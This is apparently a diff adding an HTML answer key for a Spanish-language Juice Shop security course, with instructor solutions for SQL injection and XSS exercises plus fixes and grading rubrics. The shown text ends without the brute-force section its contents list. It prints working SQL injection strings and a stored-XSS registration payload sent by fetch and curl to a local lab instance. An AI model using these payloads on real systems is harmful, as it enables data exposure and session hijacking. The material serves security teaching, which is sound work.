@@ -1,0 +1,1909 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   soluciones_profesor
+  </title>
+ </head>
+ <body>
+  <h1 id="soluciones-para-el-profesor-practica-integradora-juice-shop">
+   Soluciones para el profesor — Práctica Integradora Juice Shop
+  </h1>
+  <div class="toc" id="table-of-contents">
+   <h2 id="contents-header">
+    Tabla de contenidos
+   </h2>
+   <ul class="toc">
+    <li class="toc">
+     <a class="toc" href="#2-inyeccion-sql-sqli">
+      2. Inyección SQL (SQLi)
+     </a>
+    </li>
+    <li class="toc">
+     <a class="toc" href="#3-cross-site-scripting-xss">
+      3. Cross-Site Scripting (XSS)
+     </a>
+    </li>
+    <li class="toc">
+     <a class="toc" href="#4-fuerza-bruta-y-autenticacion">
+      4. Fuerza Bruta y Autenticación
+     </a>
+    </li>
+    <li class="toc">
+     <a class="toc" href="#criterios-generales-de-evaluacion">
+      Criterios generales de evaluación
+     </a>
+    </li>
+   </ul>
+  </div>
+  <blockquote>
+   <p>
+    <strong>
+     CONFIDENCIAL
+    </strong>
+    — Este documento contiene las soluciones completas de todos los ejercicios. No compartir con los alumnos.
+   </p>
+  </blockquote>
+  <hr/>
+  <div class="chapter-container">
+   <h2 id="2-inyeccion-sql-sqli">
+    2. Inyección SQL (SQLi)
+   </h2>
+   <h3 id="ejercicio-1-desafio-christmas-special">
+    Ejercicio 1: Desafío "Christmas Special"
+   </h3>
+   <p>
+    <strong>
+     Objetivo:
+    </strong>
+    Encontrar un producto navideño oculto (soft-deleted) y agregarlo al carrito.
+   </p>
+   <p>
+    <strong>
+     Paso 1 — Descubrir el producto oculto:
+    </strong>
+   </p>
+   <p>
+    En la barra de búsqueda de Juice Shop, inyectar:
+   </p>
+   <div class="highlight language-text">
+    <pre><span></span>')) UNION SELECT id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt FROM Products WHERE deletedAt IS NOT NULL--
+</pre>
+   </div>
+   <p>
+    Esto devuelve los productos eliminados. El producto navideño es
+    <strong>
+     "Christmas Super-Surprise-Box (2014 Edition)"
+    </strong>
+    con
+    <code>
+     id = 10
+    </code>
+    (puede variar según la versión).
+   </p>
+   <p>
+    <strong>
+     Alternativa más simple
+    </strong>
+    — buscar directamente:
+   </p>
+   <div class="highlight language-text">
+    <pre><span></span>christmas'))--
+</pre>
+   </div>
+   <p>
+    Esto cierra la consulta original y comenta el filtro
+    <code>
+     deletedAt IS NULL
+    </code>
+    que normalmente oculta los productos eliminados.
+   </p>
+   <p>
+    <strong>
+     Paso 2 — Agregar al carrito vía API:
+    </strong>
+   </p>
+   <p>
+    El carrito no permite agregar productos eliminados desde la UI, pero sí desde la API:
+   </p>
+   <div class="highlight language-javascript">
+    <div class="collapsible-container" data-max-lines="6">
+     <pre><span></span><span class="c1">// Desde la consola del navegador, estando logueado:</span>
+<span class="nx">fetch</span><span class="p">(</span><span class="s2">"/api/BasketItems"</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s2">"POST"</span><span class="p">,</span>
+<span class="w">  </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="s2">"Content-Type"</span><span class="o">:</span><span class="w"> </span><span class="s2">"application/json"</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">"Authorization"</span><span class="o">:</span><span class="w"> </span><span class="s2">"Bearer "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s2">"token"</span><span class="p">)</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+<span class="w">    </span><span class="nx">ProductId</span><span class="o">:</span><span class="w"> </span><span class="mf">10</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">BasketId</span><span class="o">:</span><span class="w"> </span><span class="s2">"1"</span><span class="p">,</span><span class="w">   </span><span class="c1">// el BasketId del usuario actual (ver en /rest/basket/1)</span>
+<span class="w">    </span><span class="nx">quantity</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="w">  </span><span class="p">})</span>
+<span class="p">});</span>
+</pre>
+    </div>
+   </div>
+   <p>
+    <strong>
+     Criterio de corrección:
+    </strong>
+    - 40% — Encontrar el producto oculto con SQLi
+- 30% — Identificar el ID del producto
+- 30% — Agregarlo al carrito exitosamente (aparece en el scoreboard)
+   </p>
+   <hr/>
+   <h3 id="ejercicio-2-endpoint-de-busqueda-seguro">
+    Ejercicio 2: Endpoint de búsqueda seguro
+   </h3>
+   <p>
+    <strong>
+     Solución esperada:
+    </strong>
+   </p>
+   <div class="highlight language-typescript">
+    <div class="collapsible-container" data-max-lines="6">
+     <pre><span></span><span class="k">import</span><span class="w"> </span><span class="nx">express</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">"express"</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">Op</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">"sequelize"</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">Product</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">"./models/product"</span><span class="p">;</span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">router</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
+
+<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/api/products/search"</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">term</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">q</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="ow">typeof</span><span class="w"> </span><span class="nx">term</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="s2">"string"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s2">"Parámetro q requerido"</span><span class="w"> </span><span class="p">});</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">products</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">Product</span><span class="p">.</span><span class="nx">findAll</span><span class="p">({</span>
+<span class="w">    </span><span class="nx">where</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="nx">Op</span><span class="p">.</span><span class="nx">like</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="sb">`%</span><span class="si">${</span><span class="nx">term</span><span class="si">}</span><span class="sb">%`</span><span class="w"> </span><span class="p">},</span>
+<span class="w">      </span><span class="nx">deletedAt</span><span class="o">:</span><span class="w"> </span><span class="kt">null</span><span class="p">,</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nx">limit</span><span class="o">:</span><span class="w"> </span><span class="kt">50</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">attributes</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"id"</span><span class="p">,</span><span class="w"> </span><span class="s2">"name"</span><span class="p">,</span><span class="w"> </span><span class="s2">"description"</span><span class="p">,</span><span class="w"> </span><span class="s2">"price"</span><span class="p">,</span><span class="w"> </span><span class="s2">"image"</span><span class="p">],</span>
+<span class="w">  </span><span class="p">});</span>
+
+<span class="w">  </span><span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">products</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="k">export</span><span class="w"> </span><span class="k">default</span><span class="w"> </span><span class="nx">router</span><span class="p">;</span>
+</pre>
+    </div>
+   </div>
+   <p>
+    <strong>
+     Puntos clave que deben estar:
+    </strong>
+   </p>
+   <table>
+    <thead>
+     <tr>
+      <th>
+       Requisito
+      </th>
+      <th>
+       Qué buscar en la solución del alumno
+      </th>
+     </tr>
+    </thead>
+    <tbody>
+     <tr>
+      <td>
+       Consultas parametrizadas
+      </td>
+      <td>
+       Usa métodos del ORM (
+       <code>
+        findAll
+       </code>
+       ,
+       <code>
+        where
+       </code>
+       ) o
+       <code>
+        replacements
+       </code>
+       . NO concatena strings en SQL.
+      </td>
+     </tr>
+     <tr>
+      <td>
+       Límite de 50
+      </td>
+      <td>
+       Tiene
+       <code>
+        limit: 50
+       </code>
+       o equivalente
+      </td>
+     </tr>
+     <tr>
+      <td>
+       Solo productos no eliminados
+      </td>
+      <td>
+       Filtra
+       <code>
+        deletedAt: null
+       </code>
+       o usa
+       <code>
+        paranoid: true
+       </code>
+       en el modelo
+      </td>
+     </tr>
+     <tr>
+      <td>
+       Validación de input
+      </td>
+      <td>
+       Verifica que
+       <code>
+        q
+       </code>
+       exista y sea string
+      </td>
+     </tr>
+    </tbody>
+   </table>
+   <p>
+    <strong>
+     Errores comunes a detectar:
+    </strong>
+    - Usar
+    <code>
+     sequelize.query()
+    </code>
+    con template literals — es la misma vulnerabilidad que estamos enseñando
+- Olvidar el filtro de
+    <code>
+     deletedAt
+    </code>
+    - No poner límite de resultados
+   </p>
+   <hr/>
+   <h3 id="ejercicio-3-analisis-del-codigo-fuente">
+    Ejercicio 3: Análisis del código fuente
+   </h3>
+   <p>
+    <strong>
+     Respuesta esperada:
+    </strong>
+   </p>
+   <p>
+    El archivo vulnerable en Juice Shop es
+    <code>
+     routes/search.ts
+    </code>
+    (o
+    <code>
+     routes/search.js
+    </code>
+    en el build). La línea vulnerable es similar a:
+   </p>
+   <div class="highlight language-typescript">
+    <pre><span></span><span class="c1">// Dentro de routes/search.ts</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">criteria</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">q</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">'undefined'</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s1">''</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">q</span><span class="w"> </span><span class="o">??</span><span class="w"> </span><span class="s1">''</span>
+<span class="nx">models</span><span class="p">.</span><span class="nx">sequelize</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span>
+<span class="w">  </span><span class="sb">`SELECT * FROM Products WHERE ((name LIKE '%</span><span class="si">${</span><span class="nx">criteria</span><span class="si">}</span><span class="sb">%' OR description LIKE '%</span><span class="si">${</span><span class="nx">criteria</span><span class="si">}</span><span class="sb">%') AND deletedAt IS NULL) ORDER BY name`</span>
+<span class="p">)</span>
+</pre>
+   </div>
+   <p>
+    <strong>
+     Por qué es vulnerable:
+    </strong>
+    El valor de
+    <code>
+     criteria
+    </code>
+    proviene directamente de
+    <code>
+     req.query.q
+    </code>
+    (input del usuario) y se concatena en el string SQL con template literals. No hay sanitización ni parametrización.
+   </p>
+   <p>
+    <strong>
+     Cómo corregirlo:
+    </strong>
+   </p>
+   <div class="highlight language-typescript">
+    <div class="collapsible-container" data-max-lines="6">
+     <pre><span></span><span class="nx">models</span><span class="p">.</span><span class="nx">sequelize</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span>
+<span class="w">  </span><span class="sb">`SELECT * FROM Products WHERE ((name LIKE :term OR description LIKE :term) AND deletedAt IS NULL) ORDER BY name`</span><span class="p">,</span>
+<span class="w">  </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">replacements</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">term</span><span class="o">:</span><span class="w"> </span><span class="sb">`%</span><span class="si">${</span><span class="nx">criteria</span><span class="si">}</span><span class="sb">%`</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="kr">type</span><span class="o">:</span><span class="w"> </span><span class="nx">QueryTypes</span><span class="p">.</span><span class="nx">SELECT</span><span class="p">,</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">)</span>
+</pre>
+    </div>
+   </div>
+   <p>
+    O mejor aún, usar el ORM:
+   </p>
+   <div class="highlight language-typescript">
+    <div class="collapsible-container" data-max-lines="6">
+     <pre><span></span><span class="kd">const</span><span class="w"> </span><span class="nx">products</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">Product</span><span class="p">.</span><span class="nx">findAll</span><span class="p">({</span>
+<span class="w">  </span><span class="nx">where</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="p">[</span><span class="nx">Op</span><span class="p">.</span><span class="nx">or</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">      </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="nx">Op</span><span class="p">.</span><span class="nx">like</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="sb">`%</span><span class="si">${</span><span class="nx">criteria</span><span class="si">}</span><span class="sb">%`</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">},</span>
+<span class="w">      </span><span class="p">{</span><span class="w"> </span><span class="nx">description</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="nx">Op</span><span class="p">.</span><span class="nx">like</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="sb">`%</span><span class="si">${</span><span class="nx">criteria</span><span class="si">}</span><span class="sb">%`</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="p">],</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nx">paranoid</span><span class="o">:</span><span class="w"> </span><span class="kt">true</span><span class="p">,</span><span class="w"> </span><span class="c1">// respeta deletedAt automáticamente</span>
+<span class="p">});</span>
+</pre>
+    </div>
+   </div>
+   <p>
+    <strong>
+     Criterio de corrección:
+    </strong>
+    - 30% — Identifica el archivo y la línea correcta
+- 40% — Explica correctamente por qué la concatenación es vulnerable
+- 30% — Propone una corrección funcional con parámetros
+   </p>
+   <hr/>
+  </div>
+  <div class="chapter-container">
+   <h2 id="3-cross-site-scripting-xss">
+    3. Cross-Site Scripting (XSS)
+   </h2>
+   <h3 id="ejercicio-1-desafio-client-side-xss-protection">
+    Ejercicio 1: Desafío "Client-side XSS Protection"
+   </h3>
+   <p>
+    <strong>
+     Contexto:
+    </strong>
+    El formulario de registro tiene validación client-side que impide caracteres HTML en el email. Pero la validación solo está en el frontend (Angular), no en el backend.
+   </p>
+   <p>
+    <strong>
+     Solución — Bypass por API directa:
+    </strong>
+   </p>
+   <div class="highlight language-javascript">
+    <div class="collapsible-container" data-max-lines="6">
+     <pre><span></span><span class="c1">// Desde la consola del navegador o con curl:</span>
+<span class="nx">fetch</span><span class="p">(</span><span class="s2">"/api/Users/"</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s2">"POST"</span><span class="p">,</span>
+<span class="w">  </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s2">"Content-Type"</span><span class="o">:</span><span class="w"> </span><span class="s2">"application/json"</span><span class="w"> </span><span class="p">},</span>
+<span class="w">  </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+<span class="w">    </span><span class="nx">email</span><span class="o">:</span><span class="w"> </span><span class="s2">"&lt;iframe src=\"javascript:alert('xss')\"&gt;@juice-sh.op"</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">password</span><span class="o">:</span><span class="w"> </span><span class="s2">"password123"</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">passwordRepeat</span><span class="o">:</span><span class="w"> </span><span class="s2">"password123"</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">securityQuestion</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span>
+<span class="w">      </span><span class="nx">question</span><span class="o">:</span><span class="w"> </span><span class="s2">"Your eldest siblings middle name?"</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nx">securityAnswer</span><span class="o">:</span><span class="w"> </span><span class="s2">"test"</span>
+<span class="w">  </span><span class="p">})</span>
+<span class="p">});</span>
+</pre>
+    </div>
+   </div>
+   <p>
+    <strong>
+     ¿Qué pasa después?
+    </strong>
+    El email con el payload XSS se guarda en la base de datos. Cuando un administrador ve la lista de usuarios en el panel de administración (
+    <code>
+     /#/administration
+    </code>
+    ), el email se renderiza con
+    <code>
+     innerHTML
+    </code>
+    y ejecuta el JavaScript.
+   </p>
+   <p>
+    <strong>
+     Con curl:
+    </strong>
+   </p>
+   <div class="highlight language-bash">
+    <div class="collapsible-container" data-max-lines="6">
+     <pre><span></span>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://localhost:3000/api/Users/<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">"Content-Type: application/json"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">'{</span>
+<span class="s1">    "email": "&lt;iframe src=\"javascript:alert(xss)\"&gt;@juice-sh.op",</span>
+<span class="s1">    "password": "password123",</span>
+<span class="s1">    "passwordRepeat": "password123",</span>
+<span class="s1">    "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"},</span>
+<span class="s1">    "securityAnswer": "test"</span>
+<span class="s1">  }'</span>
+</pre>
+    </div>
+   </div>
+   <p>
+    <strong>
+     Criterio de corrección:
+    </strong>
+    - 30% — Identifica que la validación es solo client-side
+- 40% — Logra enviar el request directamente a la API (fetch o curl)
+- 30% — El desafío aparece como completado en el scoreboard
+   </p>
+   <hr/>
+   <h3 id="ejercicio-2-middleware-de-seguridad-http">
+    Ejercicio 2: Middleware de seguridad HTTP
+   </h3>
+   <p>
+    <strong>
+     Solución esperada:
+    </strong>
+   </p>
+   <div class="highlight language-typescript">
+    <div class="collapsible-container" data-max-lines="6">
+     <pre><span></span><span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">Request</span><span class="p">,</span><span class="w"> </span><span class="nx">Response</span><span class="p">,</span><span class="w"> </span><span class="nx">NextFunction</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">"express"</span><span class="p">;</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">securityHeaders</span><span class="p">(</span><span class="nx">req</span><span class="o">:</span><span class="w"> </span><span class="kt">Request</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="o">:</span><span class="w"> </span><span class="kt">Response</span><span class="p">,</span><span class="w"> </span><span class="nx">next</span><span class="o">:</span><span class="w"> </span><span class="kt">NextFunction</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="c1">// Content Security Policy — bloquea scripts inline y frames</span>
+<span class="w">  </span><span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span>
+<span class="w">    </span><span class="s2">"Content-Security-Policy"</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-src 'none'; frame-ancestors 'none'"</span>
+<span class="w">  </span><span class="p">);</span>
+
+<span class="w">  </span><span class="c1">// Evita que el navegador adivine el Content-Type (previene sniffing)</span>
+<span class="w">  </span><span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s2">"X-Content-Type-Options"</span><span class="p">,</span><span class="w"> </span><span class="s2">"nosniff"</span><span class="p">);</span>
+
+<span class="w">  </span><span class="c1">// Impide que la página se cargue en un iframe (anti-clickjacking)</span>
+<span class="w">  </span><span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s2">"X-Frame-Options"</span><span class="p">,</span><span class="w"> </span><span class="s2">"DENY"</span><span class="p">);</span>
+
+<span class="w">  </span><span class="nx">next</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="k">export</span><span class="w"> </span><span class="k">default</span><span class="w"> </span><span class="nx">securityHeaders</span><span class="p">;</span>
+
+<span class="c1">// Uso:</span>
+<span class="c1">// app.use(securityHeaders);</span>
+</pre>
+    </div>
+   </div>
+   <p>
+    <strong>
+     Alternativa con helmet (también válida):
+    </strong>
+   </p>
+   <div class="highlight language-typescript">
+    <div class="collapsible-container" data-max-lines="6">
+     <pre><span></span><span class="k">import</span><span class="w"> </span><span class="nx">helmet</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">"helmet"</span><span class="p">;</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">helmet</span><span class="p">({</span>
+<span class="w">  </span><span class="nx">contentSecurityPolicy</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">directives</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nx">defaultSrc</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"'self'"</span><span class="p">],</span>
+<span class="w">      </span><span class="nx">scriptSrc</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"'self'"</span><span class="p">],</span>
+<span class="w">      </span><span class="nx">styleSrc</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"'self'"</span><span class="p">,</span><span class="w"> </span><span class="s2">"'unsafe-inline'"</span><span class="p">],</span>
+<span class="w">      </span><span class="nx">imgSrc</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"'self'"</span><span class="p">,</span><span class="w"> </span><span class="s2">"data:"</span><span class="p">],</span>
+<span class="w">      </span><span class="nx">frameSrc</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"'none'"</span><span class="p">],</span>
+<span class="w">      </span><span class="nx">frameAncestors</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"'none'"</span><span class="p">],</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nx">xContentTypeOptions</span><span class="o">:</span><span class="w"> </span><span class="kt">true</span><span class="p">,</span>
+<span class="w">  </span><span class="nx">frameguard</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">action</span><span class="o">:</span><span class="w"> </span><span class="s2">"deny"</span><span class="w"> </span><span class="p">},</span>
+<span class="p">}));</span>
+</pre>
+    </div>
+   </div>
+   <p>
+    <strong>
+     Criterio de corrección:
+    </strong>
+   </p>
+   <table>
+    <thead>
+     <tr>
+      <th>
+       Header
+      </th>
+      <th>
+       Qué verificar
+      </th>
+      <th>
+       Puntos
+      </th>
+     </tr>
+    </thead>
+    <tbody>
+     <tr>
+      <td>
+       <code>
+        Content-Security-Policy
+       </code>
+      </td>
+      <td>
+       Incluye
+       <code>
+        script-src
+       </code>
+       sin
+       <code>
+        'unsafe-inline'
+       </code>
+       y
+       <code>
+        frame-src 'none'
+       </code>
+      </td>
+      <td>
+       40%
+      </td>
+     </tr>
+     <tr>
+      <td>
+       <code>
+        X-Content-Type-Options
+       </code>
+      </td>
+      <td>
+       Valor es
+       <code>
+        nosniff
+       </code>
+      </td>
+      <td>
+       20%
+      </td>
+     </tr>
+     <tr>
+      <td>
+       <code>
+        X-Frame-Options
+       </code>
+      </td>
+      <td>
+       Valor es
+       <code>
+        DENY
+       </code>
+       (o
+       <code>
+        SAMEORIGIN
+       </code>
+       — aceptable)
+      </td>
+      <td>
+       20%
+      </td>
+     </tr>
+     <tr>
+      <td>
+       Estructura
+      </td>
+      <td>
+       Es un middleware válido con
+       <code>
+        (req, res, next)
+       </code>
+      </td>
+      <td>
+       20%
+      </td>
+     </tr>
+    </tbody>
+   </table>
+   <p>
+    <strong>
+     Errores comunes:
+    </strong>
+    - Poner
+    <code>
+     'unsafe-inline'
+    </code>
+    en
+    <code>
+     script-src
+    </code>
+    — esto anula la protección contra XSS inline
+- Olvidar llamar a
+    <code>
+     next()
+    </code>
+    - Poner los headers después de
+    <code>
+     res.send()
+    </code>
+    (no tienen efecto)
+   </p>
+   <hr/>
+   <h3 id="ejercicio-3-analisis-de-innerhtml-en-juice-shop">
+    Ejercicio 3: Análisis de innerHTML en Juice Shop
+   </h3>
+   <p>
+    <strong>
+     Respuesta esperada:
+    </strong>
+   </p>
+   <p>
+    En el frontend de Juice Shop (código Angular), el componente de búsqueda usa
+    <code>
+     [innerHTML]
+    </code>
+    para mostrar el término de búsqueda. Se puede encontrar en:
+   </p>
+   <p>
+    <strong>
+     Archivo:
+    </strong>
+    <code>
+     frontend/src/app/search-result/search-result.component.html
+    </code>
+   </p>
+   <p>
+    La línea relevante es similar a:
+   </p>
+   <div class="highlight language-html">
+    <pre><span></span><span class="p">&lt;</span><span class="nt">div</span> <span class="err">[</span><span class="na">innerHTML</span><span class="err">]="'</span><span class="na">Search</span> <span class="na">Results</span> <span class="na">-</span> <span class="err">'</span> <span class="err">+</span> <span class="na">searchValue</span><span class="err">"</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</pre>
+   </div>
+   <p>
+    <strong>
+     Por qué es peligroso:
+    </strong>
+   </p>
+   <p>
+    <code>
+     [innerHTML]
+    </code>
+    en Angular bypasea el mecanismo de sanitización por defecto. Cuando Angular usa interpolación
+    <code>
+     {{ }}
+    </code>
+    , automáticamente escapa caracteres HTML (
+    <code>
+     &lt;
+    </code>
+    ,
+    <code>
+     &gt;
+    </code>
+    ,
+    <code>
+     "
+    </code>
+    , etc.). Pero
+    <code>
+     [innerHTML]
+    </code>
+    inserta el contenido como HTML real, permitiendo que tags como
+    <code>
+     &lt;iframe&gt;
+    </code>
+    ,
+    <code>
+     &lt;img onerror=...&gt;
+    </code>
+    ,
+    <code>
+     &lt;svg onload=...&gt;
+    </code>
+    se interpreten y ejecuten código.
+   </p>
+   <p>
+    <strong>
+     Alternativa segura:
+    </strong>
+   </p>
+   <div class="highlight language-html">
+    <pre><span></span><span class="cm">&lt;!-- Opción 1: interpolación (escapa automáticamente) --&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>Search Results - {{ searchValue }}<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+
+<span class="cm">&lt;!-- Opción 2: si se necesita HTML, sanitizar explícitamente en el componente --&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="err">[</span><span class="na">innerHTML</span><span class="err">]="</span><span class="na">sanitizedSearchValue</span><span class="err">"</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</pre>
+   </div>
+   <div class="highlight language-typescript">
+    <pre><span></span><span class="c1">// En el componente:</span>
+<span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">DomSanitizer</span><span class="p">,</span><span class="w"> </span><span class="nx">SecurityContext</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">"@angular/platform-browser"</span><span class="p">;</span>
+
+<span class="k">this</span><span class="p">.</span><span class="nx">sanitizedSearchValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">sanitizer</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span>
+<span class="w">  </span><span class="nx">SecurityContext</span><span class="p">.</span><span class="nx">HTML</span><span class="p">,</span>
+<span class="w">  </span><span class="s2">"Search Results - "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">searchValue</span>
+<span class="p">)</span><span class="w"> </span><span class="o">??</span><span class="w"> </span><span class="s2">""</span><span class="p">;</span>
+</pre>
+   </div>
+   <p>
+    <strong>
+     Criterio de corrección:
+    </strong>
+    - 30% — Encuentra el uso de
+    <code>
+     [innerHTML]
+    </code>
+    (puede ser con DevTools &gt; Sources)
+- 40% — Explica correctamente la diferencia entre
+    <code>
+     [innerHTML]
+    </code>
+    e interpolación
+    <code>
+     {{ }}
+    </code>
+    - 30% — Propone alternativa segura (interpolación o DomSanitizer)
+   </p>
